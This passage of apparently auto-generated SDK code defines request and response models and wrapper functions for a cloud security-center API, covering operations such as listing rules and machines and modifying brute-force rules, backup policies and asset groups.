  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'ListPrivateRegistryType',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listPrivateRegistryType(): ListPrivateRegistryTypeResponse {
  var runtime = new Util.RuntimeOptions{};
  return listPrivateRegistryTypeWithOptions(runtime);
}

model ListRuleTargetAllRequest {
  clusterId?: string(name='ClusterId'),
}

model ListRuleTargetAllResponseBody = {
  requestId?: string(name='RequestId'),
  ruleTargetList?: [ 
    {
      targetId?: long(name='TargetId'),
      targetName?: string(name='TargetName'),
      targetType?: string(name='TargetType'),
    }
  ](name='RuleTargetList'),
}

model ListRuleTargetAllResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListRuleTargetAllResponseBody(name='body'),
}

async function listRuleTargetAllWithOptions(request: ListRuleTargetAllRequest, runtime: Util.RuntimeOptions): ListRuleTargetAllResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListRuleTargetAll',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listRuleTargetAll(request: ListRuleTargetAllRequest): ListRuleTargetAllResponse {
  var runtime = new Util.RuntimeOptions{};
  return listRuleTargetAllWithOptions(request, runtime);
}

model ListSystemAggregationRulesRequest {
  aggregationIds?: [ int32 ](name='AggregationIds'),
  currentPage?: int32(name='CurrentPage'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  ruleName?: string(name='RuleName'),
  ruleTypes?: [ int32 ](name='RuleTypes'),
  systemType?: int32(name='SystemType'),
}

model ListSystemAggregationRulesResponseBody = {
  aggregationList?: [ 
    {
      id?: int32(name='Id'),
      name?: string(name='Name'),
      ruleCount?: int32(name='RuleCount'),
    }
  ](name='AggregationList'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model ListSystemAggregationRulesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListSystemAggregationRulesResponseBody(name='body'),
}

async function listSystemAggregationRulesWithOptions(request: ListSystemAggregationRulesRequest, runtime: Util.RuntimeOptions): ListSystemAggregationRulesResponse {
  Util.validateModel(request);
  var query = OpenApiUtil.query(Util.toMap(request));
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListSystemAggregationRules',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listSystemAggregationRules(request: ListSystemAggregationRulesRequest): ListSystemAggregationRulesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listSystemAggregationRulesWithOptions(request, runtime);
}

model ListSystemClientRuleTypesResponseBody = {
  requestId?: string(name='RequestId'),
  ruleTypes?: [ string ](name='RuleTypes'),
}

model ListSystemClientRuleTypesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListSystemClientRuleTypesResponseBody(name='body'),
}

async function listSystemClientRuleTypesWithOptions(runtime: Util.RuntimeOptions): ListSystemClientRuleTypesResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'ListSystemClientRuleTypes',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listSystemClientRuleTypes(): ListSystemClientRuleTypesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listSystemClientRuleTypesWithOptions(runtime);
}

model ListSystemClientRulesRequest {
  aggregationIds?: [ int32 ](name='AggregationIds'),
  currentPage?: int32(name='CurrentPage'),
  isContainer?: int32(name='IsContainer'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  ruleName?: string(name='RuleName'),
  ruleTypes?: [ int32 ](name='RuleTypes'),
  systemType?: int32(name='SystemType'),
}

model ListSystemClientRulesResponseBody = {
  pageInfo?: {
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  ruleList?: [ 
    {
      aggregationName?: string(name='AggregationName'),
      description?: string(name='Description'),
      platform?: string(name='Platform'),
      policies?: [ 
        {
          policyKey?: string(name='PolicyKey'),
          policyName?: string(name='PolicyName'),
        }
      ](name='Policies'),
      ruleId?: long(name='RuleId'),
      ruleName?: string(name='RuleName'),
      ruleType?: int32(name='RuleType'),
      status?: int32(name='Status'),
      switchId?: string(name='SwitchId'),
    }
  ](name='RuleList'),
}

model ListSystemClientRulesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListSystemClientRulesResponseBody(name='body'),
}

async function listSystemClientRulesWithOptions(request: ListSystemClientRulesRequest, runtime: Util.RuntimeOptions): ListSystemClientRulesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aggregationIds)) {
    query['AggregationIds'] = request.aggregationIds;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.isContainer)) {
    query['IsContainer'] = request.isContainer;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.ruleName)) {
    query['RuleName'] = request.ruleName;
  }
  if (!Util.isUnset(request.ruleTypes)) {
    query['RuleTypes'] = request.ruleTypes;
  }
  if (!Util.isUnset(request.systemType)) {
    query['SystemType'] = request.systemType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListSystemClientRules',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listSystemClientRules(request: ListSystemClientRulesRequest): ListSystemClientRulesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listSystemClientRulesWithOptions(request, runtime);
}

model ListSystemRuleAggregationTypesRequest {
  lang?: string(name='Lang'),
}

model ListSystemRuleAggregationTypesResponseBody = {
  aggregationTypeList?: [ 
    {
      id?: int32(name='Id'),
      name?: string(name='Name'),
    }
  ](name='AggregationTypeList'),
  requestId?: string(name='RequestId'),
}

model ListSystemRuleAggregationTypesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListSystemRuleAggregationTypesResponseBody(name='body'),
}

async function listSystemRuleAggregationTypesWithOptions(request: ListSystemRuleAggregationTypesRequest, runtime: Util.RuntimeOptions): ListSystemRuleAggregationTypesResponse {
  Util.validateModel(request);
  var query = OpenApiUtil.query(Util.toMap(request));
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListSystemRuleAggregationTypes',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listSystemRuleAggregationTypes(request: ListSystemRuleAggregationTypesRequest): ListSystemRuleAggregationTypesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listSystemRuleAggregationTypesWithOptions(request, runtime);
}

model ListUninstallAegisMachinesRequest {
  currentPage?: int32(name='CurrentPage'),
  os?: string(name='Os'),
  pageSize?: int32(name='PageSize'),
  regionIdStr?: string(name='RegionIdStr'),
  regionNo?: string(name='RegionNo'),
  remark?: string(name='Remark'),
  sourceIp?: string(name='SourceIp'),
  vendor?: int32(name='Vendor'),
}

model ListUninstallAegisMachinesResponseBody = {
  currentPage?: int32(name='CurrentPage'),
  machineList?: [ 
    {
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      machineRegion?: string(name='MachineRegion'),
      os?: string(name='Os'),
      regionId?: string(name='RegionId'),
      uuid?: string(name='Uuid'),
      vendor?: int32(name='Vendor'),
      vendorName?: string(name='VendorName'),
    }
  ](name='MachineList'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model ListUninstallAegisMachinesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListUninstallAegisMachinesResponseBody(name='body'),
}

async function listUninstallAegisMachinesWithOptions(request: ListUninstallAegisMachinesRequest, runtime: Util.RuntimeOptions): ListUninstallAegisMachinesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.os)) {
    query['Os'] = request.os;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.regionIdStr)) {
    query['RegionIdStr'] = request.regionIdStr;
  }
  if (!Util.isUnset(request.regionNo)) {
    query['RegionNo'] = request.regionNo;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.vendor)) {
    query['Vendor'] = request.vendor;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListUninstallAegisMachines',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listUninstallAegisMachines(request: ListUninstallAegisMachinesRequest): ListUninstallAegisMachinesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listUninstallAegisMachinesWithOptions(request, runtime);
}

model ListUuidsByWebPathRequest {
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  type?: string(name='Type'),
  webPath?: string(name='WebPath'),
}

model ListUuidsByWebPathResponseBody = {
  list?: [ 
    {
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      machineName?: string(name='MachineName'),
      uuid?: string(name='Uuid'),
    }
  ](name='List'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model ListUuidsByWebPathResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListUuidsByWebPathResponseBody(name='body'),
}

async function listUuidsByWebPathWithOptions(request: ListUuidsByWebPathRequest, runtime: Util.RuntimeOptions): ListUuidsByWebPathResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.webPath)) {
    query['WebPath'] = request.webPath;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListUuidsByWebPath',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listUuidsByWebPath(request: ListUuidsByWebPathRequest): ListUuidsByWebPathResponse {
  var runtime = new Util.RuntimeOptions{};
  return listUuidsByWebPathWithOptions(request, runtime);
}

model ListVulAutoRepairConfigRequest {
  aliasName?: string(name='AliasName'),
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  type?: string(name='Type'),
}

model ListVulAutoRepairConfigResponseBody = {
  code?: string(name='Code'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
  vulAutoRepairConfigList?: [ 
    {
      aliasName?: string(name='AliasName'),
      id?: long(name='Id'),
      name?: string(name='Name'),
      reason?: string(name='Reason'),
      type?: string(name='Type'),
    }
  ](name='VulAutoRepairConfigList'),
}

model ListVulAutoRepairConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListVulAutoRepairConfigResponseBody(name='body'),
}

async function listVulAutoRepairConfigWithOptions(request: ListVulAutoRepairConfigRequest, runtime: Util.RuntimeOptions): ListVulAutoRepairConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListVulAutoRepairConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listVulAutoRepairConfig(request: ListVulAutoRepairConfigRequest): ListVulAutoRepairConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return listVulAutoRepairConfigWithOptions(request, runtime);
}

model ModifyAccessKeyLeakDealRequest {
  id?: long(name='Id'),
  idList?: [ long ](name='IdList'),
  remark?: string(name='Remark'),
  type?: string(name='Type'),
}

model ModifyAccessKeyLeakDealResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyAccessKeyLeakDealResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyAccessKeyLeakDealResponseBody(name='body'),
}

async function modifyAccessKeyLeakDealWithOptions(request: ModifyAccessKeyLeakDealRequest, runtime: Util.RuntimeOptions): ModifyAccessKeyLeakDealResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.idList)) {
    query['IdList'] = request.idList;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyAccessKeyLeakDeal',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyAccessKeyLeakDeal(request: ModifyAccessKeyLeakDealRequest): ModifyAccessKeyLeakDealResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyAccessKeyLeakDealWithOptions(request, runtime);
}

model ModifyAntiBruteForceRuleRequest {
  defaultRule?: boolean(name='DefaultRule'),
  failCount?: int32(name='FailCount'),
  forbiddenTime?: int32(name='ForbiddenTime'),
  id?: long(name='Id'),
  name?: string(name='Name'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp'),
  span?: int32(name='Span'),
  uuidList?: [ string ](name='UuidList'),
}

model ModifyAntiBruteForceRuleResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyAntiBruteForceRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyAntiBruteForceRuleResponseBody(name='body'),
}

async function modifyAntiBruteForceRuleWithOptions(request: ModifyAntiBruteForceRuleRequest, runtime: Util.RuntimeOptions): ModifyAntiBruteForceRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.defaultRule)) {
    query['DefaultRule'] = request.defaultRule;
  }
  if (!Util.isUnset(request.failCount)) {
    query['FailCount'] = request.failCount;
  }
  if (!Util.isUnset(request.forbiddenTime)) {
    query['ForbiddenTime'] = request.forbiddenTime;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.span)) {
    query['Span'] = request.span;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyAntiBruteForceRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyAntiBruteForceRule(request: ModifyAntiBruteForceRuleRequest): ModifyAntiBruteForceRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyAntiBruteForceRuleWithOptions(request, runtime);
}

model ModifyAppVulScanCycleRequest {
  cycle?: string(name='Cycle'),
}

model ModifyAppVulScanCycleResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyAppVulScanCycleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyAppVulScanCycleResponseBody(name='body'),
}

async function modifyAppVulScanCycleWithOptions(request: ModifyAppVulScanCycleRequest, runtime: Util.RuntimeOptions): ModifyAppVulScanCycleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.cycle)) {
    query['Cycle'] = request.cycle;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyAppVulScanCycle',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyAppVulScanCycle(request: ModifyAppVulScanCycleRequest): ModifyAppVulScanCycleResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyAppVulScanCycleWithOptions(request, runtime);
}

model ModifyAssetGroupRequest {
  groupId?: long(name='GroupId'),
  sourceIp?: string(name='SourceIp'),
  uuids?: string(name='Uuids'),
}

model ModifyAssetGroupResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyAssetGroupResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyAssetGroupResponseBody(name='body'),
}

async function modifyAssetGroupWithOptions(request: ModifyAssetGroupRequest, runtime: Util.RuntimeOptions): ModifyAssetGroupResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyAssetGroup',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyAssetGroup(request: ModifyAssetGroupRequest): ModifyAssetGroupResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyAssetGroupWithOptions(request, runtime);
}

model ModifyAssetImportantRequest {
  importantCode?: int32(name='ImportantCode'),
  uuidList?: string(name='UuidList'),
}

model ModifyAssetImportantResponseBody = {
  errCode?: string(name='ErrCode'),
  errMessage?: string(name='ErrMessage'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model ModifyAssetImportantResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyAssetImportantResponseBody(name='body'),
}

async function modifyAssetImportantWithOptions(request: ModifyAssetImportantRequest, runtime: Util.RuntimeOptions): ModifyAssetImportantResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.importantCode)) {
    query['ImportantCode'] = request.importantCode;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyAssetImportant',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyAssetImportant(request: ModifyAssetImportantRequest): ModifyAssetImportantResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyAssetImportantWithOptions(request, runtime);
}

model ModifyAutoDelConfigRequest {
  days?: int32(name='Days'),
}

model ModifyAutoDelConfigResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyAutoDelConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyAutoDelConfigResponseBody(name='body'),
}

async function modifyAutoDelConfigWithOptions(request: ModifyAutoDelConfigRequest, runtime: Util.RuntimeOptions): ModifyAutoDelConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.days)) {
    query['Days'] = request.days;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyAutoDelConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyAutoDelConfig(request: ModifyAutoDelConfigRequest): ModifyAutoDelConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyAutoDelConfigWithOptions(request, runtime);
}

model ModifyBackupPolicyRequest {
  id?: long(name='Id'),
  name?: string(name='Name'),
  policy?: map[string]any(name='Policy'),
  policyRegionId?: string(name='PolicyRegionId'),
  policyVersion?: string(name='PolicyVersion'),
  uuidList?: [ string ](name='UuidList'),
}

model ModifyBackupPolicyShrinkRequest {
  id?: long(name='Id'),
  name?: string(name='Name'),
  policyShrink?: string(name='Policy'),
  policyRegionId?: string(name='PolicyRegionId'),
  policyVersion?: string(name='PolicyVersion'),
  uuidList?: [ string ](name='UuidList'),
}

model ModifyBackupPolicyResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyBackupPolicyResponseBody(name='body'),
}

async function modifyBackupPolicyWithOptions(tmpReq: ModifyBackupPolicyRequest, runtime: Util.RuntimeOptions): ModifyBackupPolicyResponse {
  Util.validateModel(tmpReq);
  var request = new ModifyBackupPolicyShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.policy)) {
    request.policyShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.policy, 'Policy', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.policyShrink)) {
    query['Policy'] = request.policyShrink;
  }
  if (!Util.isUnset(request.policyRegionId)) {
    query['PolicyRegionId'] = request.policyRegionId;
  }
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyBackupPolicy(request: ModifyBackupPolicyRequest): ModifyBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyBackupPolicyWithOptions(request, runtime);
}

model ModifyBackupPolicyStatusRequest {
  id?: long(name='Id'),
  policyVersion?: string(name='PolicyVersion'),
  status?: string(name='Status'),
}

model ModifyBackupPolicyStatusResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyBackupPolicyStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyBackupPolicyStatusResponseBody(name='body'),
}

async function modifyBackupPolicyStatusWithOptions(request: ModifyBackupPolicyStatusRequest, runtime: Util.RuntimeOptions): ModifyBackupPolicyStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyBackupPolicyStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyBackupPolicyStatus(request: ModifyBackupPolicyStatusRequest): ModifyBackupPolicyStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyBackupPolicyStatusWithOptions(request, runtime);
}

model ModifyClearLogstoreStorageRequest {
  from?: string(name='From'),
  lang?: string(name='Lang'),
  userLogStore?: string(name='UserLogStore'),
  userProject?: string(name='UserProject'),
}

model ModifyClearLogstoreStorageResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyClearLogstoreStorageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyClearLogstoreStorageResponseBody(name='body'),
}

async function modifyClearLogstoreStorageWithOptions(request: ModifyClearLogstoreStorageRequest, runtime: Util.RuntimeOptions): ModifyClearLogstoreStorageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.userLogStore)) {
    query['UserLogStore'] = request.userLogStore;
  }
  if (!Util.isUnset(request.userProject)) {
    query['UserProject'] = request.userProject;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyClearLogstoreStorage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyClearLogstoreStorage(request: ModifyClearLogstoreStorageRequest): ModifyClearLogstoreStorageResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyClearLogstoreStorageWithOptions(request, runtime);
}

model ModifyClientConfSetupRequest {
  strategyConfig?: string(name='StrategyConfig'),
  strategyTag?: string(name='StrategyTag'),
  strategyTagValue?: string(name='StrategyTagValue'),
}

model ModifyClientConfSetupResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyClientConfSetupResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyClientConfSetupResponseBody(name='body'),
}

async function modifyClientConfSetupWithOptions(request: ModifyClientConfSetupRequest, runtime: Util.RuntimeOptions): ModifyClientConfSetupResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.strategyConfig)) {
    query['StrategyConfig'] = request.strategyConfig;
  }
  if (!Util.isUnset(request.strategyTag)) {
    query['StrategyTag'] = request.strategyTag;
  }
  if (!Util.isUnset(request.strategyTagValue)) {
    query['StrategyTagValue'] = request.strategyTagValue;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyClientConfSetup',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
